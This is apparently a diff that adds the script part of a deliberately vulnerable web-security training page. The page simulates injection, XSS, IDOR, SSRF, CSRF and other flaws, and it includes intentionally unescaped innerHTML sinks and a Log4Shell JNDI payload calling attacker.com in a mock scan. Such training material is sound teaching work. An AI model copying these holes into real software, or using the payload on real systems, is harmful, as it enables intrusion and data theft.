+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Rate Limiting -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">⏱️</div>
+                        <div class="card-title">
+                            <h3>Brute Force Test <span class="owasp-badge">A07:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <div class="session-info">
+                        Attempts: <code id="attemptCount">0</code><br>
+                        Status: <span id="rateLimitStatus" style="color:#00ff88">No limit</span>
+                    </div>
+                    
+                    <button onclick="attemptLogin()">Attempt Login</button>
+                    <button onclick="resetAttempts()" style="margin-top: 10px;">Reset Counter</button>
+                    
+                    <div class="result" id="bruteResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 No Rate Limiting:</h4>
+                        <ul>
+                            <li>Unlimited login attempts</li>
+                            <li>No CAPTCHA</li>
+                            <li>Brute force possible</li>
+                            <li>Account enumeration</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let currentSession = {
+            id: null,
+            user: 'guest',
+            role: 'none'
+        };
+        let comments = [];
+        let attemptCount = 0;
+
+        // Navigation
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // A01: Broken Access Control - Login
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const result = document.getElementById('loginResult');
+            
+            const sqlQuery = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+            console.log('[SQLi] Query:', sqlQuery);
+            
+            if (username.includes("'") || username.toLowerCase().includes(" or ") || 
+                password.includes("'") || password.toLowerCase().includes(" or ")) {
+                currentSession = {
+                    id: 'session_' + Math.random().toString(36).substr(2, 9),
+                    user: username,
+                    role: 'admin'
+                };
+                updateSessionDisplay();
+                result.className = 'result success';
+                result.style.display = 'block';
+                result.innerHTML = `<strong>🚨 SQL INJECTION SUCCESSFUL!</strong><br>
+                    Bypassed authentication with: ${username}<br>
+                    <pre>${sqlQuery}</pre>
+                    Session ID: ${currentSession.id}<br>
+                    Welcome, ${currentSession.user} (${currentSession.role})`;
+            } else if (username === 'ardx123' && password === 'ardx1234') {
+                currentSession = {
+                    id: 'session_' + Math.random().toString(36).substr(2, 9),
+                    user: username,
+                    role: 'user'
+                };
+                updateSessionDisplay();
+                result.className = 'result success';
+                result.style.display = 'block';
+                result.innerHTML = `<strong>✅ Login Successful!</strong><br>Welcome back, ${username}!<br>Session: ${currentSession.id}`;
+            } else {
+                result.className = 'result error';
+                result.style.display = 'block';
+                result.innerHTML = `<strong>❌ Login Failed!</strong><br>Invalid credentials for: ${username}`;
+            }
+        });
+
+        function updateSessionDisplay() {
+            document.getElementById('sessionId').textContent = currentSession.id || 'Not logged in';
+            document.getElementById('sessionUser').textContent = currentSession.user;
+            document.getElementById('sessionRole').textContent = currentSession.role;
+            document.getElementById('currentRole').textContent = currentSession.role;
+        }
+
+        // Session Management
+        function fixSession() {
+            const result = document.getElementById('sessionResult');
+            currentSession.id = 'FIXED_SESSION_12345';
+            updateSessionDisplay();
+            result.className = 'result success';
+            result.style.display = 'block';
+            result.innerHTML = '<strong>⚠️ SESSION FIXATION!</strong><br>Session ID fixed to: FIXED_SESSION_12345<br>Attacker can now hijack this session!';
+        }
+
+        function viewAllSessions() {
+            const result = document.getElementById('sessionResult');
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>🚨 IDOR VULNERABILITY!</strong><br>
+                <pre>Session 1: {user: "admin", role: "admin", token: "abc123"}
+Session 2: {user: "john_doe", role: "user", token: "def456"}  
+Session 3: {user: "jane_smith", role: "user", token: "ghi789"}
+Session 4: {user: "ardx123", role: "user", token: "jkl012"}</pre>
+                <small>⚠️ All user sessions exposed without authorization!</small>`;
+        }
+
+        // Password Reset IDOR
+        document.getElementById('resetForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('resetEmail').value;
+            const result = document.getElementById('resetResult');
+            
+            result.className = 'result success';
+            result.style.display = 'block';
+            
+            if (email.includes('user_id') || email.includes('admin')) {
+                result.innerHTML = `<strong>🚨 IDOR EXPLOIT!</strong><br>
+                    Reset token generated for: ${email}<br>
+                    Token: <code>reset_token_${Math.random().toString(36).substr(2, 9)}</code><br>
+                    <small style="color:#ff6666;">⚠️ Any user's password can be reset!</small>`;
+            } else {
+                result.innerHTML = `<strong>✅ Reset Link Sent!</strong><br>
+                    Check email: ${email}<br>
+                    Token: <code>reset_token_${Math.random().toString(36).substr(2, 9)}</code>`;
+            }
+        });
+
+        // A03: SQL Injection - Search
+        document.getElementById('searchForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const query = document.getElementById('searchQuery').value;
+            const result = document.getElementById('searchResult');
+            
+            const sqlQuery = `SELECT * FROM users WHERE username LIKE '%${query}%'`;
+            console.log('[SQLi] Query:', sqlQuery);
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            
+            if (query.includes('UNION') || query.includes('union')) {
+                result.innerHTML = `<strong>🚨 UNION-BASED SQL INJECTION!</strong><br>
+                    <pre>${sqlQuery}</pre>
+                    <strong>Extracted Data:</strong>
+                    <pre>ID | Username | Password Hash
+1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99
+2  | ardx123  | e10adc3949ba59abbe56e057f20f883e
+3  | john_doe | 098f6bcd4621d373cade4e832627b4f6</pre>`;
+            } else if (query.includes("'")) {
+                result.innerHTML = `<strong>⚠️ SQL ERROR EXPOSED!</strong><br>
+                    <pre>MySQL Error: You have an error in your SQL syntax near '${query}'
+Query: ${sqlQuery}
+Stack Trace:
+  at executeQuery (db.js:45)
+  at searchUsers (api.js:123)</pre>`;
+            } else {
+                result.innerHTML = `<strong>Search Results for: "${query}"</strong><br>
+                    Found 3 users: ardx123, admin, test_user`;
+            }
+        });
+
+        // Command Injection
+        document.getElementById('pingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const host = document.getElementById('host').value;
+            const result = document.getElementById('pingResult');
+            
+            const command = `ping -c 4 ${host}`;
+            console.log('[CMD] Executing:', command);
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            
+            if (host.includes(';') || host.includes('|') || host.includes('&') || host.includes('`')) {
+                result.innerHTML = `<strong>🚨 COMMAND INJECTION!</strong><br>
+                    <pre>$ ${command}
+
+PING ${host.split(/[;|&`]/)[0]} ...
+64 bytes from ${host.split(/[;|&`]/)[0]}: time=1.23 ms
+
+--- Executing injected command ---
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+total 48
+drwxr-xr-x 2 root root 4096 Jan 15 10:30 .
+-rw-r--r-- 1 root root  220 Jan 15 10:30 passwords.txt
+-rw-r--r-- 1 root root 3.2K Jan 15 10:30 database.sql
+
+[!] Command injection successful!</pre>`;
+            } else {
+                result.innerHTML = `<strong>Ping Results:</strong><br>
+                    <pre>PING ${host} (${host}): 56 data bytes
+64 bytes from ${host}: icmp_seq=0 ttl=64 time=1.234 ms
+64 bytes from ${host}: icmp_seq=1 ttl=64 time=1.456 ms
+--- ${host} ping statistics ---
+2 packets transmitted, 2 received, 0.0% packet loss</pre>`;
+            }
+        });
+
+        // LDAP Injection
+        document.getElementById('ldapForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const query = document.getElementById('ldapQuery').value;
+            const result = document.getElementById('ldapResult');
+            
+            const ldapQuery = `(&(objectClass=person)(cn=${query}))`;
+            console.log('[LDAP] Query:', ldapQuery);
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            
+            if (query === '*' || query.includes('*)(') || query.includes('admin')) {
+                result.innerHTML = `<strong>🚨 LDAP INJECTION!</strong><br>
+                    <pre>Query: ${ldapQuery}
+
+Results (ALL USERS DUMPED):
+cn=John Doe,ou=users,dc=company,dc=com
+cn=Admin User,ou=admins,dc=company,dc=com
+cn=Jane Smith,ou=users,dc=company,dc=com
+cn=Database Admin,ou=admins,dc=company,dc=com
+
+[!] Bypass successful - All directory entries exposed!</pre>`;
+            } else {
+                result.innerHTML = `<strong>LDAP Search Results:</strong><br>
+                    <pre>Found: cn=${query},ou=users,dc=company,dc=com
+Email: ${query.toLowerCase().replace(' ', '.')}@company.com
+Phone: +1-555-0123</pre>`;
+            }
+        });
+
+        // XXE
+        document.getElementById('xmlForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const xml = document.getElementById('xmlData').value;
+            const result = document.getElementById('xmlResult');
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            
+            if (xml.includes('<!ENTITY') || xml.includes('SYSTEM')) {
+                result.innerHTML = `<strong>🚨 XXE ATTACK DETECTED!</strong><br>
+                    <pre>Parsed XML with external entity:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:999:999::/home/mysql:/bin/sh
+
+[!] Sensitive system file accessed!
+[!] External Entity processed - File contents exposed!
+[!] Could also perform SSRF to internal services!</pre>`;
+            } else {
+                result.innerHTML = `<strong>✅ XML Parsed Successfully</strong><br>
+                    <pre>${xml}</pre>`;
+            }
+        });
+
+        // XSS - Reflected
+        document.getElementById('xssSearchForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const search = document.getElementById('xssSearch').value;
+            const result = document.getElementById('xssSearchResult');
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>Search results for: ${search}</strong><br>No products found matching "${search}"`;
+        });
+
+        // XSS - Stored
+        document.getElementById('commentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('commentUser').value;
+            const text = document.getElementById('commentText').value;
+            
+            comments.push({ user, text });
+            displayComments();
+            
+            document.getElementById('commentUser').value = '';
+            document.getElementById('commentText').value = '';
+        });
+
+        function displayComments() {
+            const container = document.getElementById('comments');
+            container.innerHTML = '';
+            comments.forEach(comment => {
+                const box = document.createElement('div');
+                box.className = 'comment-box';
+                box.innerHTML = `<div class="user">${comment.user}</div><div class="content">${comment.text}</div>`;
+                container.appendChild(box);
+            });
+        }
+
+        // DOM XSS
+        function loadProfile() {
+            const userId = document.getElementById('domUserId').value;
+            const result = document.getElementById('domResult');
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>User Profile:</strong><br>User ID: ${userId}<br>Name: Test User<br>Email: user@example.com`;
+        }
+
+        // IDOR
+        document.getElementById('idorForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const userId = document.getElementById('userId').value;
+            const result = document.getElementById('idorResult');
+            
+            const users = {
+                1: { name: 'Admin User', email: 'admin@company.com', ssn: '123-45-6789', salary: '$150,000' },
+                2: { name: 'John Doe', email: 'john@company.com', ssn: '234-56-7890', salary: '$75,000' },
+                3: { name: 'Jane Smith', email: 'jane@company.com', ssn: '345-67-8901', salary: '$85,000' },
+                10: { name: 'CEO', email: 'ceo@company.com', ssn: '111-11-1111', salary: '$500,000' }
+            };
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            
+            if (users[userId]) {
+                result.innerHTML = `<strong>🚨 IDOR - Accessing User #${userId}</strong><br>
+                    <pre>${JSON.stringify(users[userId], null, 2)}</pre>
+                    <small style="color:#ff6666;">⚠️ Sensitive data exposed without authorization!</small>`;
+            } else {
+                result.innerHTML = `<strong>User Not Found</strong><br>ID: ${userId}`;
+            }
+        });
+
+        // Path Traversal
+        function viewFile(filename) {
+            if (!filename) return;
+            
+            const result = document.getElementById('fileResult');
+            result.className = 'result info';
+            result.style.display = 'block';
+            
+            console.log('[Path Traversal] Accessing:', filename);
+            
+            if (filename.includes('..') || filename.includes('/etc/')) {
+                result.innerHTML = `<strong>🚨 PATH TRAVERSAL!</strong><br>
+                    <pre>File: ${filename}
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:999:999::/home/mysql:/bin/sh
+
+[!] Sensitive system file accessed via path traversal!</pre>`;
+            } else {
+                const files = {
+                    'readme.txt': 'Welcome to our application!\nVersion 1.0\nFor support, contact admin@example.com',
+                    'config.json': '{\n  "database": "mysql://root:password@localhost:3306/webapp",\n  "api_key": "sk-1234567890abcdef",\n  "debug": true\n}',
+                    'data.csv': 'id,name,email\n1,John Doe,john@example.com\n2,Jane Smith,jane@example.com'
+                };
+                
+                result.innerHTML = `<strong>📄 ${filename}</strong><br>
+                    <pre>${files[filename] || 'File not found'}</pre>`;
+            }
+        }
+
+        // CSRF
+        document.getElementById('transferForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const recipient = document.getElementById('recipient').value;
+            const amount = document.getElementById('amount').value;
+            const result = document.getElementById('transferResult');
+            
+            console.log('[CSRF] Transfer:', { recipient, amount, csrf_token: 'NONE' });
+            
+            result.className = 'result success';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>💸 Transfer Completed!</strong><br>
+                Sent: <strong>${amount}</strong> to <code>${recipient}</code><br>
+                <small style="color:#ff6666;">⚠️ No CSRF protection! Attacker could forge this request from another site!</small>`;
+        });
+
+        // Privilege Escalation
+        document.getElementById('roleForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const action = document.getElementById('roleAction').value;
+            const result = document.getElementById('roleResult');
+            
+            result.className = 'result success';
+            result.style.display = 'block';
+            
+            if (action === 'admin' || action === 'delete') {
+                result.innerHTML = `<strong>🚨 PRIVILEGE ESCALATION!</strong><br>
+                    Action: <code>${action}</code><br>
+                    Current Role: <code>${currentSession.role}</code><br>
+                    <pre>Admin panel accessed!
+User deleted: user_id=5
+Database tables: users, passwords, credit_cards
+[!] No authorization check performed!</pre>`;
+            } else {
+                result.innerHTML = `<strong>✅ Action Executed</strong><br>
+                    Action: <code>${action}</code> completed successfully`;
+            }
+        });
+
+        // Weak Encryption
+        document.getElementById('encryptForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const data = document.getElementById('encryptData').value;
+            const result = document.getElementById('encryptResult');
+            
+            // Weak "encryption" - just Base64
+            const encrypted = btoa(data);
+            const rot13 = data.replace(/[a-zA-Z]/g, c => 
+                String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
+            );
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>🚨 WEAK ENCRYPTION!</strong><br>
+                Original: <code>${data}</code><br>
+                "Encrypted" (Base64): <code>${encrypted}</code><br>
+                "Encrypted" (ROT13): <code>${rot13}</code><br>
+                <small style="color:#ff6666;">⚠️ This is NOT real encryption! Easily reversible!</small><br>
+                <button onclick="alert('Decrypted: ${data}')" style="margin-top:10px; width:auto; padding:8px 15px;">Decrypt</button>`;
+        });
+
+        // Weak Hashing
+        document.getElementById('hashForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const password = document.getElementById('hashPassword').value;
+            const result = document.getElementById('hashResult');
+            
+            // Simulate MD5 hash (weak)
+            const fakeHash = Array.from(password).reduce((s, c) => 
+                Math.imul(31, s) + c.charCodeAt(0) | 0, 0
+            ).toString(16).padStart(32, '0');
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>🚨 WEAK HASHING ALGORITHM!</strong><br>
+                Password: <code>${password}</code><br>
+                MD5 Hash: <code>${fakeHash}</code><br>
+                <small style="color:#ff6666;">⚠️ MD5 is broken! No salt! Vulnerable to rainbow tables!</small><br>
+                <small>Common passwords like "password123" can be cracked instantly</small>`;
+        });
+
+        // Insecure Deserialization
+        document.getElementById('deserializeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const data = document.getElementById('serialData').value;
+            const result = document.getElementById('deserializeResult');
+            
+            try {
+                const obj = JSON.parse(data);
+                console.log('[Deserialize] Object:', obj);
+                
+                // Simulate privilege escalation
+                if (obj.role === 'admin') {
+                    currentSession.role = 'admin';
+                    updateSessionDisplay();
+                }
+                
+                result.className = 'result success';
+                result.style.display = 'block';
+                result.innerHTML = `<strong>🚨 INSECURE DESERIALIZATION!</strong><br>
+                    <pre>${JSON.stringify(obj, null, 2)}</pre>
+                    ${obj.role === 'admin' ? '<strong style="color:#ff6666;">⚠️ Privilege escalated to admin!</strong>' : ''}
+                    <small>⚠️ No integrity check! Object injection possible!</small>`;
+            } catch (e) {
+                result.className = 'result error';
+                result.style.display = 'block';
+                result.innerHTML = `<strong>Parse Error:</strong><br>${e.message}`;
+            }
+        });
+
+        // File Upload
+        document.getElementById('uploadForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const file = document.getElementById('fileUpload').files[0];
+            const result = document.getElementById('uploadResult');
+            
+            if (!file) return;
+            
+            const ext = file.name.split('.').pop().toLowerCase();
+            const dangerous = ['php', 'exe', 'sh', 'bat', 'cmd', 'jsp', 'asp', 'aspx', 'war'];
+            
+            result.style.display = 'block';
+            
+            if (dangerous.includes(ext)) {
+                result.className = 'result error';
+                result.innerHTML = `<strong>🚨 MALICIOUS FILE UPLOADED!</strong><br>
+                    Filename: <code>${file.name}</code><br>
+                    Type: <code>${file.type || 'unknown'}</code><br>
+                    Size: <code>${(file.size / 1024).toFixed(2)} KB</code><br>
+                    Extension: <code>.${ext}</code><br>
+                    <strong style="color:#ff0000;">⚠️ Web shell could be executed!</strong><br>
+                    <pre>Uploaded to: /uploads/${file.name}
+Accessible at: http://site.com/uploads/${file.name}
+[!] Remote Code Execution possible!</pre>`;
+            } else {
+                result.className = 'result success';
+                result.innerHTML = `<strong>✅ File Uploaded</strong><br>
+                    Filename: <code>${file.name}</code><br>
+                    Size: <code>${(file.size / 1024).toFixed(2)} KB</code><br>
+                    <small>⚠️ Still vulnerable - no real validation!</small>`;
+            }
+        });
+
+        // SSRF
+        document.getElementById('ssrfForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const url = document.getElementById('ssrfUrl').value;
+            const result = document.getElementById('ssrfResult');
+            
+            console.log('[SSRF] Fetching:', url);
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            
+            if (url.includes('localhost') || url.includes('127.0.0.1') || url.includes('169.254.169.254') || url.startsWith('file://')) {
+                result.innerHTML = `<strong>🚨 SSRF ATTACK!</strong><br>
+                    Accessing: <code>${url}</code><br>
+                    <pre>HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "internal_api": true,
+  "admin_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+  "database": "postgresql://admin:secret@internal-db:5432/maindb",
+  "aws_keys": {
+    "access_key": "AKIAIOSFODNN7EXAMPLE",
+    "secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+  },
+  "services": ["admin-panel", "internal-api", "monitoring"]
+}
+
+[!] Internal service accessed via SSRF!
+[!] Cloud metadata exposed!
+[!] Credentials leaked!</pre>`;
+            } else {
+                result.innerHTML = `<strong>Fetching URL...</strong><br>
+                    <pre>HTTP/1.1 200 OK
+Content-Type: text/html
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Example Site&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;Content from ${url}&lt;/body&gt;
+&lt;/html&gt;</pre>`;
+            }
+        });
+
+        // Security Misconfiguration
+        function viewLogs() {
+            const result = document.getElementById('debugResult');
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>🚨 ERROR LOGS EXPOSED!</strong><br>
+                <pre>[ERROR] MySQL connection failed: Access denied for user 'root'@'localhost' (password: 'P@ssw0rd123')
+[ERROR] Failed to load /admin/config.php - File not found
+[DEBUG] API Key: sk-1234567890abcdef
+[DEBUG] Session token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+[ERROR] SQL Error: SELECT * FROM users WHERE id=1'; DROP TABLE users;--
+[WARNING] Unauthorized access attempt from 192.168.1.100
+[DEBUG] Full request dump: POST /api/login {"user":"admin","pass":"secret"}
+
+[!] Verbose error messages expose sensitive data!</pre>`;
+        }
+
+        function viewConfig() {
+            const result = document.getElementById('debugResult');
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>🚨 CONFIG FILE EXPOSED!</strong><br>
+                <pre># config.php
+define('DB_HOST', 'localhost');
+define('DB_USER', 'root');
+define('DB_PASS', 'toor123!@#');
+define('DB_NAME', 'webapp_prod');
+
+define('API_KEY', 'sk-live-1234567890abcdef');
+define('SECRET_KEY', 'super_secret_key_do_not_share');
+define('DEBUG_MODE', true);
+define('DISPLAY_ERRORS', true);
+
+// AWS Credentials
+$aws_access = 'AKIAIOSFODNN7EXAMPLE';
+$aws_secret = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
+
+[!] All credentials exposed in config file!</pre>`;
+        }
+
+        // Vulnerable Components
+        function scanVulnerabilities() {
+            const result = document.getElementById('componentResult');
+            result.className = 'result error';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>🚨 VULNERABILITY SCAN RESULTS</strong><br>
+                <pre>Scanning installed components...
+
+[CRITICAL] Log4j 2.14.1 - CVE-2021-44228 (Log4Shell)
+  - Remote Code Execution
+  - CVSS Score: 10.0
+  - Exploit: \${jndi:ldap://attacker.com/a}
+
+[CRITICAL] Apache Struts 2.3.34 - CVE-2017-5638
+  - Remote Code Execution  
+  - CVSS Score: 10.0
+  - Publicly exploitable
+
+[HIGH] jQuery 1.8.3 - CVE-2020-11022, CVE-2020-11023
+  - Cross-Site Scripting
+  - CVSS Score: 6.1
+
+[HIGH] OpenSSL 1.0.1 - CVE-2014-0160 (Heartbleed)
+  - Information Disclosure
+  - CVSS Score: 7.5
+
+[MEDIUM] Bootstrap 3.3.7 - Multiple XSS vulnerabilities
+
+Total: 7 HIGH/CRITICAL vulnerabilities found!
+Recommendation: UPDATE ALL COMPONENTS IMMEDIATELY!</pre>`;
+        }
+
+        // API Endpoint
+        document.getElementById('apiForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const result = document.getElementById('apiResult');
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>🚨 EXCESSIVE DATA EXPOSURE!</strong><br>
+                <pre>GET /api/users
+
+{
+  "users": [
+    {
+      "id": 1,
+      "username": "admin",
+      "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
+      "email": "admin@company.com",
+      "ssn": "123-45-6789",
+      "credit_card": "4532-1234-5678-9010",
+      "salary": 150000,
+      "home_address": "123 Main St",
+      "phone": "+1-555-0100",
+      "api_token": "tok_1234567890abcdef"
+    },
+    {
+      "id": 2,
+      "username": "john_doe",
+      "password_hash": "e10adc3949ba59abbe56e057f20f883e",
+      "email": "john@company.com",
+      "ssn": "234-56-7890",
+      "credit_card": "5412-3456-7890-1234",
+      "salary": 75000,
+      "medical_records": "...",
+      "api_token": "tok_abcdef1234567890"
+    }
+  ]
+}
+
+[!] Sensitive PII exposed without authentication!
+[!] No pagination or filtering
+[!] Passwords hashes visible!</pre>`;
+        });
+
+        // Brute Force
+        function attemptLogin() {
+            attemptCount++;
+            document.getElementById('attemptCount').textContent = attemptCount;
+            const result = document.getElementById('bruteResult');
+            
+            result.className = 'result info';
+            result.style.display = 'block';
+            result.innerHTML = `<strong>Login Attempt #${attemptCount}</strong><br>
+                Status: <span style="color:#ff6666;">Failed</span><br>
+                <small>⚠️ No rate limiting! Brute force attack in progress...</small><br>
+                ${attemptCount >= 10 ? '<strong style="color:#ff0000;">⚠️ 10+ attempts - In production, account would be compromised!</strong>' : ''}`;
+        }
+
+        function resetAttempts() {
+            attemptCount = 0;
+            document.getElementById('attemptCount').textContent = attemptCount;
+            const result = document.getElementById('bruteResult');
+            result.style.display = 'none';
+        }
+
+        // Initialize
+        updateSessionDisplay();
+        console.log('%c⚠️ VULNERABLE APPLICATION - FOR EDUCATIONAL PURPOSES ONLY', 'color: red; font-size: 20px; font-weight: bold;');
+        console.log('%cThis application contains intentional security vulnerabilities', 'color: orange; font-size: 14px;');
+        console.log('%cDO NOT deploy to production!', 'color: red; font-size: 14px; font-weight: bold;');
+    </script>
+</body>
+</html>
